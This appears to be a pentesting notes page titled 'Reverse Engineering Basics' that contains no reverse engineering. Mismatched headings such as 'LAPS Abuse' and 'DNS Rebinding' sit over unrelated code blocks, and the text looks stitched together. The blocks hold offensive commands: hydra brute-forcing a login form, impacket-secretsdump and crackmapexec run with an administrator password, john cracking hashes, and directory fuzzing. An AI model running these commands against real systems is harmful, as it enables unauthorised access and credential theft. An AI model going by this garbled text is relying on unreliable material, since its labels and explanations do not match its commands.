---
TitleSEO: "Reverse Engineering Basics | ZureFX"
TitlePost: "Reverse Engineering Basics"
Author: "ZureFX"
Description: "Personal notes on Reverse Engineering Basics. Quick reference for pentesting and CTF challenges."
Keywords: "linux, networking, blue team, persistence"
URL: "https://zurefx.github.io/notes/note-reverse-engineering-basics-149.html"
URL_IMAGES: ""
Date: "2025-05-02"
Tags: "Linux, Networking, Blue Team, Persistence"
Section: "notes"
Lang: "en"
main_img: "note-reverse-engineering-basics-149"
Permalink: "/notes/note-reverse-engineering-basics-149.html"
BtnLabel: "Read Notes"
Pick: 0
---
## LAPS Abuse

### Unquoted Service Path

- `SeDebugPrivilege`
- `SQL Injection`
- `Cron Job`
- `impacket`
- `netcat`

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.44.234.20/FUZZ
feroxbuster -h
```

## secretsdump

### DNS Rebinding

Post-exploitation enumeration revealed a path to domain administrator privileges. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
crackmapexec smb 10.34.195.142 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## SMTP

### john

The application stored sensitive credentials in an unencrypted configuration file. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## SUID Binary

### PowerShell

```bash
gobuster dir -u http://10.74.156.139/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.87.19.164 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.45.41.194
gobuster dir -u http://10.69.235.116/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

> **Note:** CSRF was identified as the primary attack vector in this scenario.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.42.124.212 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

- `msfvenom`
- `SQL Injection`
- `Resource-Based Constrained Delegation`
